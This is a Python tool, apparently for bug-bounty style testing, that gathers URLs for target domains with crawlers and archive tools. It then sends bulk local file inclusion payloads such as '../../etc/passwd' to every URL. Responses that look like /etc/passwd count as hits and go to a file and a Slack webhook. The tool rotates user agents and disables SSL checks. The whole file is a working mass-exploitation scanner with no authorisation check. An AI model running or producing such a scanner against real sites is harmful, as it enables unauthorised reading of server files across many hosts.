import asyncio
import aiohttp
import argparse
import random
from colorama import init, Fore, Style
import os
from urllib.parse import urlparse # Removed urljoin as it wasn't strictly used by prepare_lfi_target_url

# Constants & setup
DEFAULT_BATCH_SIZE = 150
DEFAULT_BATCH_DELAY = 1.5
DEFAULT_TIMEOUT = 1.8
DEFAULT_RETRY_COUNT = 1
RESPONSE_SIZE_LIMIT = 1024 * 10  # 10 KB
SUBPROCESS_TIMEOUT = 300  # Timeout for external tools like katana, gau

init(autoreset=True)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
]

headers_template = {
    "Upgrade-Insecure-Requests": "1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

# Global counters
successful_attempts = 0
failed_attempts = 0
timeout_attempts = 0

ascii_art = """
 __      __ _               
 \ \    / /| | ___  _ __ ___ 
  \ \/\/ / | |/ _ \| '__/ _ \\
   \_/\_/  | | (_) | | |  __/
            |_|\___/|_|  \___|
# Vivek Fetcher + Bulk LFI Scanner
"""

print(Fore.CYAN + ascii_art + Style.RESET_ALL)

async def run_command_async(cmd_parts, timeout=SUBPROCESS_TIMEOUT):
    command_str_for_log = " ".join(cmd_parts)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd_parts,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)

        if proc.returncode != 0:
            error_message = stderr.decode(errors='ignore').strip()
            if error_message: # Only print if there's actual stderr content
                 print(Fore.RED + f"Error running `{command_str_for_log}` (code {proc.returncode}): {error_message}")
            else:
                 print(Fore.RED + f"Error running `{command_str_for_log}` (code {proc.returncode}), no stderr output.")
            return []

        return stdout.decode(errors='ignore').splitlines()
    except FileNotFoundError:
        print(Fore.RED + f"Command not found: {cmd_parts[0]}. Please ensure it's installed and in PATH.")
        return []
    except asyncio.TimeoutError:
        print(Fore.RED + f"Timeout ({timeout}s) running `{command_str_for_log}`.")
        if proc and proc.returncode is None: # Check if proc exists and is still running
            try:
                proc.kill()
                await proc.wait()
            except ProcessLookupError:
                pass 
            except Exception as e_kill:
                print(Fore.YELLOW + f"Warning: Could not kill timed-out process for '{command_str_for_log}': {e_kill}")
        return []
    except Exception as e:
        print(Fore.RED + f"Exception running `{command_str_for_log}`: {e}")
        return []

async def collect_urls_for_domain_async(domain):
    print(Fore.YELLOW + f"[*] Collecting URLs for {domain} ...")
    all_collected_urls = set()

    # Updated tool commands for more effectiveness / less noise
    # For Katana: -kf url only outputs URLs, -jc extracts JS links, -fx filters for specific content
    commands_config = {
        "katana": lambda d: ['katana', '-u', d, '-silent', '-nc', '-kf', 'url', '-fx', '-xhr', '-ef', 'woff,css,png,svg,jpg,woff2,jpeg,gif,ico,ttf,eot,otf,pdf,js'], # Added js to exclusion for fx
        "gau": lambda d: ['gau', '--subs', '--fp', '--providers', 'wayback,otx,commoncrawl,urlscan', d],
        "gauplus": lambda d: ['gauplus', '-subs', '-t', '10', '-random-agent', d], # Added random agent for gauplus
        "waybackurls": lambda d: ['waybackurls', d],
        "waymore": lambda d: ['waymore', '-i', d, '-mode', 'U'] # U for URLs
    }

    tasks = []
    for tool, cmd_func in commands_config.items():
        cmd_parts = cmd_func(domain)
        print(Fore.CYAN + f"    -> Queuing {tool} for {domain}...")
        tasks.append(run_command_async(cmd_parts))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    for i, result_item in enumerate(results):
        tool_name = list(commands_config.keys())[i]
        if isinstance(result_item, Exception):
            print(Fore.RED + f"    -> Error during {tool_name} execution for {domain}: {result_item}")
        elif result_item:
            print(Fore.MAGENTA + f"    -> Got {len(result_item)} URLs from {tool_name} for {domain}")
            all_collected_urls.update(r.strip() for r in result_item if r.strip())
        else:
            print(Fore.YELLOW + f"    -> No URLs from {tool_name} for {domain} (or tool error not yielding output).")
    
    # Further filter collected URLs (even after tool-specific -ef)
    filtered_urls = set()
    ignored_extensions = (
        '.woff', '.woff2', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg',
        '.ico', '.ttf', '.eot', '.otf', '.pdf', '.webp', '.avif', '.mp4', '.mov', '.js' # js also often not LFI target
    )
    for url in all_collected_urls:
        try:
            parsed_url = urlparse(url)
            if not parsed_url.scheme in ['http', 'https'] or not parsed_url.netloc:
                continue
            if not any(url.lower().endswith(ext) for ext in ignored_extensions):
                 # Additional check for common non-parameterized static file patterns
                path_lower = parsed_url.path.lower()
                if not (('/js/' in path_lower or '/css/' in path_lower or '/assets/' in path_lower or '/images/' in path_lower) and '?' not in url):
                    filtered_urls.add(url)
        except Exception:
            continue

    print(Fore.GREEN + f"[+] Collected {len(filtered_urls)} unique, filtered URLs for {domain}.")
    return list(filtered_urls)

def is_valid_passwd(content):
    if not content or len(content) > RESPONSE_SIZE_LIMIT:
        return False
    lines = content.split('\n')
    # Check for common /etc/passwd patterns:
    # - root:x:0:0 or similar lines
    # - Multiple lines with colon-separated values
    valid_lines = 0
    has_root_user = False
    for line in lines:
        if ':' in line:
            parts = line.count(':')
            if 2 <= parts <= 8: # /etc/passwd (6), /etc/shadow (8), /etc/group (3) can have varied colons
                valid_lines +=1
                if line.startswith("root:") or "bash" in line or "nologin" in line:
                    has_root_user = True # Higher confidence if 'root' or common shell paths seen
    
    return valid_lines >= 5 and has_root_user # Require at least 5 colon-lines and some indication of system users

def prepare_lfi_target_url(base_candidate_url, payload_path):
    if base_candidate_url.endswith('/'):
        base_candidate_url = base_candidate_url[:-1]
    
    if not payload_path.startswith('/'):
        normalized_payload = '/' + payload_path
    else:
        normalized_payload = payload_path
    
    return base_candidate_url + normalized_payload

async def send_slack_notification(message, slack_webhook_url):
    if not slack_webhook_url:
        return

    async with aiohttp.ClientSession() as session:
        payload_dict = {"text": message}
        try:
            async with session.post(slack_webhook_url, json=payload_dict, timeout=10) as resp:
                if resp.status != 200:
                    print(Fore.RED + f"Failed to send Slack notification: {resp.status} {await resp.text()}")
        except Exception as e:
            print(Fore.RED + f"Exception during Slack notification: {e}")

async def send_request(session, base_url_to_scan, payload_path, index, total_targets, timeout_duration, retry_limit, slack_webhook_url_config):
    global successful_attempts, failed_attempts, timeout_attempts # Using globals
    
    lfi_target_url = prepare_lfi_target_url(base_url_to_scan, payload_path)
    current_headers = headers_template.copy()
    current_headers["User-Agent"] = random.choice(user_agents)
    
    # Slight random delay before each request, independent of retry
    request_delay = random.uniform(0.1, 0.5) # Small per-request delay
    await asyncio.sleep(request_delay)

    for attempt in range(retry_limit + 1): # retry_limit=1 means 2 total attempts (0, 1)
        try:
            async with session.get(lfi_target_url, headers=current_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=timeout_duration)) as response:
                content = await response.text(errors='ignore') # Ignore decoding errors
                if is_valid_passwd(content):
                    result_message = f"Success: {base_url_to_scan} - Payload: {payload_path} - UA: {current_headers['User-Agent']}"
                    print(Fore.GREEN + Style.BRIGHT + f"[HIT] {result_message}")
                    with open("write-poc.txt", "a", encoding='utf-8') as file:
                        file.write(result_message + f" - Target URL: {lfi_target_url}\n")
                    successful_attempts += 1

                    slack_msg = f":rotating_light: *CRITICAL LFI FOUND!* \nTarget URL: `{lfi_target_url}`\nBase URL: `{base_url_to_scan}`\nPayload: `{payload_path}`\nUser-Agent: `{current_headers['User-Agent']}`"
                    await send_slack_notification(slack_msg, slack_webhook_url_config)
                else:
                    failed_attempts += 1
                return # Exit retry loop on successful processing (hit or legit fail)
        except asyncio.TimeoutError:
            if attempt == retry_limit: # Last attempt timed out
                timeout_attempts += 1
                # print(Fore.YELLOW + f"[TIMEOUT] {lfi_target_url} after {retry_limit+1} attempts") # Optional verbose log
        except aiohttp.ClientError as e: # Handles connection errors, SSL errors etc.
            if attempt == retry_limit:
                failed_attempts += 1
                # print(Fore.RED + f"[ERROR] {lfi_target_url} - {type(e).__name__}") # Optional verbose log
        except Exception as e: # Catch any other unexpected errors
            if attempt == retry_limit:
                failed_attempts += 1
                print(Fore.RED + f"[UNEXPECTED ERROR] {lfi_target_url} - {type(e).__name__}: {e}") # More detailed for unknown issues
            # For unexpected errors, it might be good to break retry or log verbosely even on early attempts
        
        if attempt < retry_limit:
            await asyncio.sleep(random.uniform(0.5, 1.5)) # Delay before retry

async def process_batch(tasks_in_batch, batch_processing_delay):
    await asyncio.gather(*tasks_in_batch)
    if batch_processing_delay > 0:
        print(f"{Fore.BLUE}Batch completed. Waiting for {batch_processing_delay:.2f} seconds before the next batch.")
        await asyncio.sleep(batch_processing_delay)

async def main(domains_str, domain_list_file, url_list_file, payloads_file, batch_size, batch_delay, req_timeout, retry_count, slack_webhook_url):
    global successful_attempts, failed_attempts, timeout_attempts # Access globals

    target_urls_to_scan = []

    if url_list_file:
        print(Fore.BLUE + f"[*] Reading URLs directly from file: {url_list_file}")
        try:
            with open(url_list_file, "r", encoding='utf-8') as f:
                target_urls_to_scan = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Loaded {len(target_urls_to_scan)} URLs from {url_list_file}.")
        except FileNotFoundError:
            print(Fore.RED + f"Error: URL list file not found: {url_list_file}")
            return
    else:
        input_domains = set()
        if domains_str:
            input_domains.update([d.strip() for d in domains_str.split(',') if d.strip()])
        
        if domain_list_file:
            try:
                with open(domain_list_file, "r", encoding='utf-8') as f:
                    input_domains.update([line.strip() for line in f if line.strip()])
                print(Fore.GREEN + f"[+] Loaded {len(input_domains)} domains from command line and {domain_list_file}.")
            except FileNotFoundError:
                print(Fore.RED + f"Error: Domain list file not found: {domain_list_file}")
                if not input_domains: # Exit if no domains from -d either
                    return
        
        if not input_domains:
            print(Fore.RED + "No domains provided via -d or -dL, and no -uL specified. Exiting.")
            parser.print_help()
            return
        
        all_discovered_urls = []
        for domain in input_domains:
            urls_for_current_domain = await collect_urls_for_domain_async(domain)
            all_discovered_urls.extend(urls_for_current_domain)
        
        target_urls_to_scan = list(set(all_discovered_urls)) # Make unique across all domains
        if not target_urls_to_scan:
            print(Fore.YELLOW + "No URLs collected from any domain. Exiting.")
            return
        print(Fore.CYAN + f"[*] Total unique URLs collected from all domains: {len(target_urls_to_scan)}")

    try:
        with open(payloads_file, "r", encoding='utf-8') as f:
            payloads = [p.strip() for p in f if p.strip()]
        if not payloads:
            print(Fore.RED + f"Error: No payloads found in {payloads_file}. Exiting.")
            return
    except FileNotFoundError:
        print(Fore.RED + f"Error: Payloads file not found: {payloads_file}")
        return

    total_requests_to_make = len(target_urls_to_scan) * len(payloads)
    if total_requests_to_make == 0:
        print(Fore.YELLOW + "No targets to scan (either no URLs or no payloads). Exiting.")
        return

    print(f"{Fore.BLUE}Total target URLs for LFI scan: {len(target_urls_to_scan)}")
    print(f"{Fore.BLUE}Total LFI payloads: {len(payloads)}")
    print(f"{Fore.BLUE}Estimated total requests: {total_requests_to_make}")
    print(f"{Fore.BLUE}Batch size: {batch_size}, Batch delay: {batch_delay}s, Timeout: {req_timeout}s, Retries per request: {retry_count}")
    if slack_webhook_url:
        print(Fore.GREEN + "Slack notifications enabled.")
    else:
        print(Fore.YELLOW + "Slack notifications disabled (no webhook URL provided).")

    connector = aiohttp.TCPConnector(limit_per_host=batch_size, ssl=False, force_close=True) # Limit per host, disable SSL verify globally, force close
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        processed_count = 0
        for base_url in target_urls_to_scan:
            for payload in payloads:
                task = send_request(session, base_url, payload, processed_count, total_requests_to_make, req_timeout, retry_count, slack_webhook_url)
                tasks.append(task)
                processed_count += 1

                if len(tasks) >= batch_size:
                    await process_batch(tasks, batch_delay)
                    tasks = []
                    print(f"Progress: {processed_count}/{total_requests_to_make} requests attempted - {Fore.GREEN}Success: {successful_attempts}{Fore.RESET}, {Fore.RED}Fail: {failed_attempts}{Fore.RESET}, {Fore.YELLOW}Timeout: {timeout_attempts}{Fore.RESET}")
        
        if tasks: # Process any remaining tasks
            await process_batch(tasks, 0) # No delay for the final batch
            print(f"Progress: {processed_count}/{total_requests_to_make} requests attempted - {Fore.GREEN}Success: {successful_attempts}{Fore.RESET}, {Fore.RED}Fail: {failed_attempts}{Fore.RESET}, {Fore.YELLOW}Timeout: {timeout_attempts}{Fore.RESET}")

    print(f"\n{Fore.BLUE}Scan completed.")
    print(f"{Fore.GREEN}Total LFI Positive (Success): {successful_attempts}")
    print(f"{Fore.RED}Total Negative (Fail/No LFI): {failed_attempts}") # This includes non-LFI valid responses
    print(f"{Fore.YELLOW}Total Timeouts: {timeout_attempts}")
    print(f"{Fore.CYAN}Total requests attempted: {successful_attempts + failed_attempts + timeout_attempts} out of {total_requests_to_make} potential requests.")
    if successful_attempts > 0:
        print(Fore.GREEN + Style.BRIGHT + "LFI vulnerabilities found! Check 'write-poc.txt' and Slack.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Vivek Fetcher + Bulk LFI Scanner with Slack notifications. Asynchronously collects URLs and scans them for LFI vulnerabilities.")
    
    # Input sources for domains/URLs
    domain_group = parser.add_mutually_exclusive_group()
    domain_group.add_argument("-d", "--domain", help="Single domain or comma-separated domains to fetch URLs from.")
    domain_group.add_argument("-dL", "--domain-list", help="File containing a list of domains (one per line) to fetch URLs from.")
    parser.add_argument("-uL", "--url-list", help="File containing a list of URLs (one per line) to scan directly, bypassing discovery.")

    # Required files
    parser.add_argument("-p", "--payloads", required=True, help="File containing list of LFI payloads (e.g., ../../etc/passwd).")

    # Performance and control
    parser.add_argument("-b", "--batch-size", type=int, default=DEFAULT_BATCH_SIZE, help=f"Number of concurrent requests per batch (default: {DEFAULT_BATCH_SIZE}).")
    parser.add_argument("-bd", "--batch-delay", type=float, default=DEFAULT_BATCH_DELAY, help=f"Seconds to wait between batches (default: {DEFAULT_BATCH_DELAY}).")
    parser.add_argument("-t", "--timeout", type=float, default=DEFAULT_TIMEOUT, help=f"Timeout for each HTTP request in seconds (default: {DEFAULT_TIMEOUT}).")
    parser.add_argument("-r", "--retry-count", type=int, default=DEFAULT_RETRY_COUNT, help=f"Number of retry attempts for failed/timeout requests (default: {DEFAULT_RETRY_COUNT}).")
    
    # Optional Slack notification
    parser.add_argument("--slack-webhook", help="Slack Webhook URL for notifications. Can also be set via SLACK_WEBHOOK_URL environment variable.", default=os.environ.get("SLACK_WEBHOOK_URL"))

    args = parser.parse_args()

    if not args.domain and not args.domain_list and not args.url_list:
        parser.error("No input specified. Please use -d, -dL, or -uL to provide targets.")

    asyncio.run(main(
        domains_str=args.domain,
        domain_list_file=args.domain_list,
        url_list_file=args.url_list,
        payloads_file=args.payloads,
        batch_size=args.batch_size,
        batch_delay=args.batch_delay,
        req_timeout=args.timeout,
        retry_count=args.retry_count,
        slack_webhook_url=args.slack_webhook
    ))
